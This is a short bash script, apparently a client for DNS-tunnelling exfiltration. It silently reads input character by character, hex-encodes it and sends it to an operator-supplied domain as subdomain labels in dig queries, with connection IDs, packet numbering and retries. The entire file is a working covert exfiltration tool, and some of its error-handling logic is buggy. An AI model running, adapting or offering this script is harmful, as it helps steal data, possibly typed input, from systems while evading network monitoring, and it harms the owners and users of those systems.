#!/bin/bash
# Send data to DNS exfiltration server.
# Usage: command [-options] domain
# Positional Arguments:
#   domain: the domain to send data to
# Options:
#   -n: number of characters to store before sending a packet

# check if there are arguments supplied
if [ $# -eq 0 ]; then
  echo $'Needs second level domain and top level domain as argument.\nEx: "example.com"'
  exit 1
fi

# set globals
local_server=""
char_queue=5
domain=""

# check command line options
while [ $# -gt 0 ]; do
  # check if server is on localhost
  if [ $1 = "-n" ]; then
    char_queue=$2
    shift
  else
    # if it isn't an option, must be a positional argument
    domain="$1"
    break
  fi
  shift
done

if [ $# -eq 0 ]; then
  echo $'Needs second level domain and top level domain as argument.\nEx: "example.com"'
  exit 1
fi

# start connection
dig_out=$(dig "a.1.1.1.$domain" A +short)
# retry if failed
while [ -z "$dig_out" ]; do
  echo "Connection failed."
  dig_out=$(dig "a.1.1.1.$domain" A +short)
done

# get connection id based on nslookup output
connection_id=$(echo "$dig_out" | grep -o -E '[0-9]*$')
# start packet number at 0
packet_number=0

# read inputs
while read -rsN1 letter; do
  # add each input to queue
  letters="$letters$letter"

  # if there are more than 4 letters in queue
  if [ ${#letters} -ge $char_queue ]; then
    # turn letters to hex
    data=$(echo "$letters" | xxd -ps -c 200 | tr -d '\n' | head -c -2)
    # format into encoding
    encoded="b.$packet_number.$connection_id.$data.$domain"

    retries=0

    # send data to server
    dig_out=$(dig $encoded A +short)
    response_code=$(echo "$dig_out" | grep -o -E '^[0-9]*')
    
    # while the packet failed
    while [ "$response_code" -ne "200" ] && [ $retries -le 5 ]; do
      if [ -n $response_code ]; then
        echo "Connection failed"
      elif [ $response_code = "201" ]; then
        echo "Malformed request sent."
      elif [ $response_code = "202" ]; then
        $dig_out=$(dig "a.1.1.1.$domain" A +short)
        if [ -z "$dig_out" ]; then
          connection_id=$(echo "$dig_out" | grep -o -E '[0-9]*$')
          response_code="200"
        fi
      elif [ $response_code = "203" ]; then
        # there was a mismatch in the expected packet_number. reset counter
        packet_number=0
      elif [ $response_code = "204" ]; then
        echo "Maximum connections."
      else
        echo "Unknown error"
      fi
      retries=$(($retries+1))
      # sleep to prevent spamming
      sleep 0.25
      dig_out=$(dig "$encoded" A +short)
    done
    # increment packet number
    packet_number=$(($packet_number+1))
    # if packet number is too large
    if [ $packet_number -gt 999 ]; then
      # reset to 1
      packet_number=0
    fi
    letters=""
    # sleep to prevent spamming
    sleep 0.25
  fi
done

exit 0